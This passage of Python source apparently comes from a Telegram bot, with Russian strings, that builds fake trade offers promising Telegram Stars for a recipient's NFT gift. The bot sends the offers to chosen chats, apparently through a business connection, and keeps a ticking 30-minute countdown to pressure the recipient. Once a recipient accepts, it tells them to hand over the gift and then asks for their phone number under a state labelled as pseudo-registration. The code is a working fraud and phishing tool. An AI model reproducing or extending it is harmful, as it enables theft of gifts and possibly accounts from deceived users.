        active_business_connection_id = bc.id
        if bc.user:
            active_business_chats[bc.user.id] = f"@{bc.user.username}" if bc.user.username else bc.user.first_name

@router.message(CommandStart())  
async def cmd_start(msg: Message):  
    args = msg.text.split(maxsplit=1)  
    if len(args) > 1 and args[1].startswith("deal_"):  
        code = args[1].replace("deal_", "")  
        deal = get_deal(code)  
        if deal:  
            custom_text = deal[4]
            gift_link = deal[5]
            expires_at = datetime.fromisoformat(deal[7]) if deal[7] else datetime.utcnow() + timedelta(minutes=30)
            
            diff = expires_at - datetime.utcnow()
            total_secs = max(0, int(diff.total_seconds()))
            mins, secs = divmod(total_secs, 60)
            timer_str = f"{mins:02d}:{secs:02d}"

            caption = (
                f"{custom_text}\n\n"
                f"Telegram\n<a href=\"{gift_link}\">Подарок</a>\n\n"
                f"⏳ <b>Предложение активно ещё {timer_str}</b>"
            )
            
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🎁 ПОКАЗАТЬ ПОДАРОК", url=gift_link)],
                [
                    InlineKeyboardButton(text="❌ Отклонить", callback_data=f"sel_reject_{code}"),
                    InlineKeyboardButton(text="✅ Принять", callback_data=f"sel_accept_{code}")
                ]
            ])
            
            await msg.answer_photo(
                photo="https://images.unsplash.com/photo-1513151233558-d860c5398176?q=80&w=1000&auto=format&fit=crop",
                caption=caption,
                parse_mode="HTML",
                reply_markup=kb
            )
            return  

    await msg.answer(  
        f"🏦 Добро пожаловать в <b>{BRAND}</b>!\n\nНажми кнопку ниже, чтобы создать сделку.",  
        parse_mode="HTML",
        reply_markup=main_menu()  
    )  

@router.message(F.text == "🤝 Создать сделку")
async def start_create_deal(msg: Message, state: FSMContext):
    await state.set_state(CreateDeal.waiting_for_text)
    await msg.answer(
        "✍️ Введите текст оффера вместе со ссылкой на подарок (например: <code>Пользователь предлагает вам 3000 ⭐ за ваш подарок https://t.me/nft/Gift</code>):",
        parse_mode="HTML"
    )

@router.message(CreateDeal.waiting_for_text)
async def process_deal_text(msg: Message, state: FSMContext):
    text_content = msg.text.strip()
    await state.clear()

    words = text_content.split()
    gift_link = "https://t.me/nft/Gift"
    for w in words:
        if w.startswith("http://") or w.startswith("https://"):
            gift_link = w
            break

    code = secrets.token_hex(4).upper()
    expires_at = datetime.utcnow() + timedelta(minutes=30)
    
    conn = db()
    conn.execute(  
        "INSERT INTO deals (code, creator_id, creator_username, custom_text, gift_link, status, expires_at, created_at) "  
        "VALUES (?,?,?,?,?,?,?,?)",  
        (code, msg.from_user.id, f"@{msg.from_user.username}" if msg.from_user.username else str(msg.from_user.id), text_content, gift_link, 'pending', expires_at.isoformat(), datetime.utcnow().isoformat())  
    )  
    conn.commit()  
    conn.close()

    send_buttons = []
    if active_business_chats:
        for cid, name in active_business_chats.items():
            send_buttons.append([InlineKeyboardButton(text=f"Отправить: {name}", callback_data=f"sendtochat_{code}_{cid}")])
    else:
        send_buttons.append([InlineKeyboardButton(text="Отправить: В этот чат", callback_data=f"sendtochat_{code}_{msg.from_user.id}")])

    send_buttons.append([InlineKeyboardButton(text="❌ Удалить ордер", callback_data=f"sel_reject_{code}")])

    kb = InlineKeyboardMarkup(inline_keyboard=send_buttons)

    caption = (
        f"✅ <b>Ордер #{code} готов!</b>\n\n"
        f"{text_content}\n\n"
        f"⏳ <b>Предложение активно ещё 29:59</b>"
    )

    await msg.answer_photo(
        photo="https://images.unsplash.com/photo-1513151233558-d860c5398176?q=80&w=1000&auto=format&fit=crop",
        caption=caption,
        parse_mode="HTML",
        reply_markup=kb
    )

@router.callback_query(F.data.startswith("sendtochat_"))
async def send_to_chat(cb: CallbackQuery):
    parts = cb.data.split("_")
    code = parts[1]
    target_chat_id = int(parts[2])
    
    deal = get_deal(code)
    if not deal:
        await cb.answer("Ордер не найден", show_alert=True)
        return

    custom_text = deal[4]
    gift_link = deal[5]
    expires_at = datetime.fromisoformat(deal[7]) if deal[7] else datetime.utcnow() + timedelta(minutes=30)

    diff = expires_at - datetime.utcnow()
    total_secs = max(0, int(diff.total_seconds()))
    mins, secs = divmod(total_secs, 60)
    timer_str = f"{mins:02d}:{secs:02d}"

    caption = (
        f"{custom_text}\n\n"
        f"Telegram\n<a href=\"{gift_link}\">Подарок</a>\n\n"
        f"⏳ <b>Предложение активно ещё {timer_str}</b>"
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 ПОКАЗАТЬ ПОДАРОК", url=gift_link)],
        [
            InlineKeyboardButton(text="❌ Отклонить", callback_data=f"sel_reject_{code}"),
            InlineKeyboardButton(text="✅ Принять", callback_data=f"sel_accept_{code}")
        ]
    ])

    if active_business_connection_id:
        sent_msg = await cb.bot.send_photo(
            chat_id=target_chat_id,
            photo="https://images.unsplash.com/photo-1513151233558-d860c5398176?q=80&w=1000&auto=format&fit=crop",
            caption=caption,
            parse_mode="HTML",
            reply_markup=kb,
            business_connection_id=active_business_connection_id
        )
    else:
        sent_msg = await cb.bot.send_photo(
            chat_id=target_chat_id,
            photo="https://images.unsplash.com/photo-1513151233558-d860c5398176?q=80&w=1000&auto=format&fit=crop",
            caption=caption,
            parse_mode="HTML",
            reply_markup=kb
        )

    # Запускаем фоновый анимированный таймер для отправленного сообщения
    asyncio.create_task(run_animation_timer(cb.bot, sent_msg.chat.id, sent_msg.message_id, code, gift_link, custom_text, expires_at, active_business_connection_id))

    await cb.message.edit_reply_markup(reply_markup=None)
    await cb.answer("✅ Ордер отправлен!")

async def run_animation_timer(bot: Bot, chat_id: int, message_id: int, code: str, gift_link: str, custom_text: str, expires_at: datetime, biz_id: str):
    while True:
        await asyncio.sleep(30) # Обновление каждые 30 секунд
        deal = get_deal(code)
        if not deal or deal[6] != 'pending':
            break

        diff = expires_at - datetime.utcnow()
        total_secs = int(diff.total_seconds())
        if total_secs <= 0:
            break

        mins, secs = divmod(total_secs, 60)
        timer_str = f"{mins:02d}:{secs:02d}"

        caption = (
            f"{custom_text}\n\n"
            f"Telegram\n<a href=\"{gift_link}\">Подарок</a>\n\n"
            f"⏳ <b>Предложение активно ещё {timer_str}</b>"
        )

        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🎁 ПОКАЗАТЬ ПОДАРОК", url=gift_link)],
            [
                InlineKeyboardButton(text="❌ Отклонить", callback_data=f"sel_reject_{code}"),
                InlineKeyboardButton(text="✅ Принять", callback_data=f"sel_accept_{code}")
            ]
        ])

        try:
            if biz_id:
                await bot.edit_message_caption(
                    chat_id=chat_id,
                    message_id=message_id,
                    caption=caption,
                    parse_mode="HTML",
                    reply_markup=kb,
                    business_connection_id=biz_id
                )
            else:
                await bot.edit_message_caption(
                    chat_id=chat_id,
                    message_id=message_id,
                    caption=caption,
                    parse_mode="HTML",
                    reply_markup=kb
                )
        except Exception:
            break

@router.callback_query(F.data.startswith("sel_accept_"))
async def sel_accept(cb: CallbackQuery, state: FSMContext):
    code = cb.data.split("_")[2]
    deal = get_deal(code)
    if not deal:
        await cb.answer("Ордер не найден", show_alert=True)
        return

    custom_text = deal[4]
    import re
    numbers = re.findall(r'\d+', custom_text.replace(" ", ""))
    amount_str = numbers[0] if numbers else "3000"

    set_db_status(code, "accepted")
    await state.update_data(deal_code=code)
    
    await cb.answer(
        text=f"Отправьте подарок в течение 30 минут, и {amount_str} ⭐ автоматически пополнятся на ваш аккаунт.",
        show_alert=True
    )
    
    await state.set_state(PseudoReg.phone)
    await cb.message.answer("📱 Введите номер телефона (+7XXXXXXXXXX):")

@router.callback_query(F.data.startswith("sel_reject_"))
async def sel_reject(cb: CallbackQuery):
    set_db_status(cb.data.split("_")[2], "rejected")
    await cb.message.edit_caption(caption="❌ Ордер отклонён.", reply_markup=None)
    await cb.answer()

